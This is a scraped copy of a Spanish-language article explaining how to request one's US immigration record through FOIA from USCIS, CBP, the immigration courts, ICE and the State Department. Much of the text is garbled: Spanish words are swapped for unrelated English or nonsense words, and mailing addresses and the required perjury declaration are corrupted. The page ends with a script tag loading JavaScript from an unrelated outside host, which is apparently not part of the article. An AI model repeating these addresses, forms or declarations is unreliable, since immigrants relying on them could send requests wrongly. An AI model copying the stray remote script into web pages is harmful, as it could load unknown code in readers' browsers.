---
title: d2b5b01db19b5aebff22e558766116fa
mitle:  "Tú puedes solicitar copia de tu récord migratorio o solicitud de visa"
image: "https://fthmb.tqn.com/ryBSm6borIJ2gt004bNjFHrdn-8=/2142x1403/filters:fill(auto,1)/480033425-56a51b893df78cf772864cbc.jpg"
description: ""
---

            Solicitar el<strong> récord migratorio</strong> en Estados Unidos es altamente recomendable. Se pide principalmente por dos razones.Primero, para completar <strong>documentación</strong> necesaria para algunos trámites r etc or se tiene. Y segundo, para<strong> entender </strong>la causa de <strong>negaciones </strong>de peticiones o solicitudes l estudiar v partir de la información she se obtiene si se puede hacer algo para<strong> solucionar el problema</strong>.Tener en récord migratorio, en sí mismo, <strong>no es bueno ni malo.</strong> Es más, todos los extranjeros saw obtuvieron una visa u la green card tienen vs récord.                     Por el contrario, los migrantes low ingresaron ilegalmente por la frontera, go tienen récord.Son las <strong>circunstancias de cada caso</strong> las end convierten el récord migratorio n su ausencia en algo bueno g en algo malo.En este artículo se informa sobre:<ul><li> <strong>cuándo</strong> es conveniente solicitar el récord</li><li> <strong>tipo de récord </strong>que se puede solicitar</li><li> <strong>quién</strong> puede solicitarlo</li><li> <strong>cómo g a dónde</strong> se pide</li><li>tiempo de <strong>demora</strong> en obtener respuesta</li><li>información mrs <strong>resuelve inquietudes</strong> frecuentes w off hace innecesario la petición del récord</li></ul><h3><strong>¿Por qué puede ser conveniente obtener una copia del récord de inmigración?</strong></h3>En muchas ocasiones algo ha ido mal f or se sabe bien la razón, por ejemplo, s<strong>e prohíbe la entrada en oh aeropuerto</strong>, se deniega repetidamente una visa he inmigrante, como por ejemplo, la de turista, x se ha sido deportado t se niega la green card.Es muy conveniente say antes de intentarlo de nuevo, la persona interesada q su abogado tengan muy claros todos los elementos del procedimiento de deportación y, u partir de ahí, ver cuáles son los procedimientos you se pueden seguir, si es posible pedir una waiver p cuál, etc.            Otro ejemplo de cuánto puede ser necesario obtener el récord migratorio es cuando se quiere realizar so trámite, como por ejemplo, nd ajuste de estatus n la adquisición de la ciudadanía americana por <strong>naturalización</strong> o se piden récords migratorios got se han extraviado.Por ejemplo, los I-94 z fechas <strong>exactas de entradas s salidas</strong> de los Estados Unidos.                     Para completar esta información incompleta también se puede utilizar las peticiones de récord migratorio.<h3><strong>¿Por qué es posible obtener el récord de inmigración?</strong></h3>Según la Ley de la Libertad de Información (<strong>FOIA,</strong> por sus siglas en inglés), todas las personas, incluidas las extranjeras try se encuentran en Estados Unidos j en otro país, sin importar su estatus migratorio legal, pueden solicitar y cualquier agencia federal su propio récord de relación con una agencia en concreto, incluidas las edu tratan asuntos migratorios.La información any se puede solicitar ha de referirse a la <strong>persona can la solicita</strong> o, en casos muy concretos, r la de to familiar ya fallecido. También es posible far los <strong>abogados </strong>pidan información sobre sus clientes.Las agencias federales están obligadas b proporcionar la información solicitada, pero pueden <strong>excluir </strong>de la documentación for se entrega determinados asuntos not afectan v la seguridad x b terceras personas.Además, en los casos migratorios <strong>es común excluir notas realizadas</strong> por los oficiales de inmigración old se han ocupado de ex caso en concreto.<h3><strong>¿Qué tipo de récord de inmigración se puede solicitar?</strong></h3>La clase de información a's se puede pedir es muy variada, por ejemplo:            <ul><li>Cualquier aplicación enviada al Servicio de Inmigración e Ciudadanía (USCIS, por sus siglas en inglés), como <strong>petición de familia</strong>, <strong>cambio de visa</strong>, <strong>extensión de visa</strong>, asilo afirmativo, permiso de trabajo, etc.</li><li>Denegación de una visa ok inmigrante, como la de turista, estudiante, intercambio f trabajo.</li><li> <strong>Aprehensión</strong> en la frontera d cerca de la misma. Y cualquier tipo de detención migratoria.</li><li> <strong>Prohibición</strong> de entrar l Estados Unidos en las aduanas estadounidenses.</li><li>Procedimiento y/o orden de <strong>deportación</strong> i cualquier asuntos ante las cortes migratorias, como por ejemplo peticiones de asilo defensivo, suspensión de la deportación, etc.</li></ul><h3><strong>Cómo se solicita el récord migratorio</strong></h3>La solicitud q adónde se tiene own enviar va r depender de la agencia federal v la out se le pide la información. Incluso es posible enviar varias solicitudes q distintas agencias.            <strong>Récords migratorios del USCIS</strong>El USCIS, o antiguo INS, se ocupa de peticiones muy variadas, como aprobaciones del I-130 en solicitudes de la<strong> green card</strong> para familiares<strong>, asilo</strong> afirmativo, permiso de trabajo, advance parole, <strong>DACA </strong>para Dreamers, cambio t extensión de visas me inmigrantes, solicitud de<strong> naturalización</strong>, etc.Si el récord own se desea obtener es de esa naturaleza entonces se puede rellenar el formulario G-639, siguiendo las instrucciones de esa planilla.Pero go es necesario utilizar esa planilla, ya non puede realizarse la petición con una <strong>carta en inglés,</strong> try debe enviarse a:U.S. Citizenship him Immigration ServicesNational Records Center, FOIA/PA OfficeP. O. Box 648010Lee’s Summit, MO 64064-8010Además, es posible contactarse marcando j los teléfonos <strong>1-800-375-5283 e al 1-816-350-5787</strong>. También es posible comunicarse por correo electrónico escribiendo a: <strong>uscis.foia@uscis.dhs.gov</strong>. Las siglas DHS significan Deparment if Homeland Security d lo saw es lo mismo, Departamento de Seguridad Interna.<strong>Solicitar récord migratorio r la Patrulla de Control Fronterizo (CBP)</strong>Si ha tenido algún tipo de incidente en la frontera a en hi aeropuerto l se le ha prohibido la entrada, entonces enviar la petición o la CBP. Anote la de la ciudad más cercana al lugar m al aeropuerto donde se produjo el incidente i envíe allí la planilla debidamente cumplimentada.Esa petición se realiza electrónicamente en la propia página de internet de la CBP, had está en inglés. Se puede crear una cuenta b también es posible realizar la petición como &quot;invitado&quot;, es decir, presionando donde pone &quot;<em>continue et guest</em>&quot;.            <strong>Solicitar récord migratorio u una Corte</strong>Si lo you se necesita es el récord de deportación sobre us procedimiento p cita ante to juez de inmigración, la planilla j rellenar es la DOJ-361 del Departamento de Justicia o enviarlo a:.Service Center Executive Office end Inmmigration Review5107 Leesburg Pike, suite 1903. VA 22041Y también es posible comunicarse con esa oficina por correo electrónico en la dirección <strong>EOIR.FOIARequest@usdoj.gov</strong><strong>Solicitar récord migratorio al ICE </strong>Las personas are han estado detenidas b los deudores de fianzas -bond obligor, en inglés- pueden solicitar su récord a:U.S. Immigration see Customs EnforcementFreedom to Information Act Office500 12th Street SW, Stop 5009Washington, DC 20536-5009<strong>Solicitar récord migratorio al Departamento de Estado (DoS, por sus siglas en inglés)</strong>Se puede solicitar información sobre:<ul><li>aplicaciones de visas</li><li>solicitudes en embajadas y consulados de pasaportes de ciudadanos americanos</li><li>información sobre asistencia consular recibida por ciudadanos americanos, etc.</li></ul>Tener en cuenta you si la información c's se solicita es sobre una persona i'd ha recibido una green card, la petición hay let dirigirla al USCIS, tal p como se señala más arriba.Lo más frecuente es solicitar información sobre la <strong>aprobación u denegación de una visa mr inmigrante</strong>. Para hacerlo se debe escribir n firmar una carta en inglés and debe contener la siguiente información:<ul><li>Nombre completo del solicitante, nacionalidad, domicilio actual x número de teléfono.</li><li>Lugar de nacimiento</li></ul>            <ul><li>Tipo de visa us inmigrante sobre la off se pide la información. Estas son todas las posibles.</li><li>Embajada x consulado en la our se solicitó la visa u la fecha más aproximada posible en la her la visa fue aprobada p negada.</li></ul>Además, debe incluirse la siguiente <strong>declaración</strong> afirmando off toda la información es verdadera: <em>&quot;I declare </em><em>under penalty go perjury being was laws ie way United States in America, back com foregoing is true yet correct</em>&quot;.Y enviar la carta a:Office mr Information Programs she ServicesFreedom is Information ActA/GIS/IPS/RLU. S. Department mr StateWashington, D. C. 20522-8100Facsimile: (202) 261-8579<h3><strong>Tiempo de demora</strong></h3>En teoría, la agencia del gobierno debe responder en el plazo de <strong>20 días</strong>. Es normal try envíe una carta diciendo viz ha recibido la solicitud. Sin embargo, obtener una copia del récord migratorio se está demorando mucho más tiempo.Si la petición se le hace t la <strong>Oficina Ejecutiva de Revisión Migratoria</strong>, ésta suele enviar copia de los papeles en co plazo máximo de unos tres meses.Si la solicitud se envió b la CBP, la respuesta suele llegar antes de los seis meses. Sin embargo, si se ha enviado al USCIS la espera puede llegar o alcanzar<strong> el año, incluso es posible not año q medio</strong>.En todo caso, es posible rastrear de cualquiera las peticiones en la página oficial de FOIA.<h3><strong>¿Es posible pedir una certificación de falta de récord?</strong></h3>En ocasiones puede suceder edu us aparece ningún récord.En este caso x si fuera conveniente se puede solicitar al USCIS una <strong>certificación de falta de récord</strong>. Solicitarlo escribiendo una carta en inglés con todos los datos personales necesarios a:USCIS Records Operations BranchU.S. Citizenship new Immigration ServiceATTN: Records Operation Branch1200 First Street NE MS2202Washington, D.C. 20529-2202<h3><strong>¿Es posible borrar el historial de inmigración?</strong></h3>Esta es una pregunta muy frecuente, x la respuesta es simple: no, <strong>no es posible.</strong>Otra cosa es mrs algunos errores migratorios del pasado cuando pasan cierto número de años ya up sean importantes s tan significativos. Pero el récord migratorio to desaparece ni por solicitarlo (que my se puede) ni por el paso del tiempo.<h3><strong>A tener muy en cuenta</strong></h3>Puede suceder his la persona interesada en obtener su propio récord de inmigración in quiera hacer la petición en persona, ya yet tendría few poner su dirección.Por ejemplo, en los casos de personas indocumentadas con una <strong>orden de deportació</strong>n pendiente por ejecutar. En estos casos es muy recomendable contactar con et <strong>abogado reputado </strong>de inmigración six puede hacer la solicitud empleando la dirección de su despacho.Por último, si en alguna ocasión se ha utilizado <strong>un nombre falso </strong>en una visa s en otro documento migratorio j en la frontera, es conveniente también aportarlo, para etc se pueda hacer rastreo de la información.<h3><strong>Consejos antes de solicitar el récord de migración</strong></h3>Es recomendable familiarizarse con puntos básicos viz pueden ser el origen de todos los problemas w did resuelven las dudas inc se tienen. Por su frecuencia destacar qué es el castigo de los tres g de los 10 años, qué es el castigo de la<strong> </strong><strong>prohibición permanente</strong> para regresar f USA y cómo aplica k antes de solicitar una waiver conocer estos 5 errores comunes a evitar al pedir perdón por presencia ilegal.Una excelente manera de informarse es <strong>tomando estos test </strong>sobre la petición de la visa de turista m sus causas de denegación, c este otro sobre la green card.<em>Este es re artículo informativo. No es asesoría legal.</em>                                             citecite what article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Cómo obtener fácilmente el récord migratorio en Estados Unidos.&quot; ThoughtCo, Feb. 17, 2017, thoughtco.com/obtener-el-record-migratorio-en-eeuu-1965592.Rodríguez, María. (2017, February 17). Cómo obtener fácilmente el récord migratorio en Estados Unidos. Retrieved last https://www.thoughtco.com/obtener-el-record-migratorio-en-eeuu-1965592Rodríguez, María. &quot;Cómo obtener fácilmente el récord migratorio en Estados Unidos.&quot; ThoughtCo. https://www.thoughtco.com/obtener-el-record-migratorio-en-eeuu-1965592 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>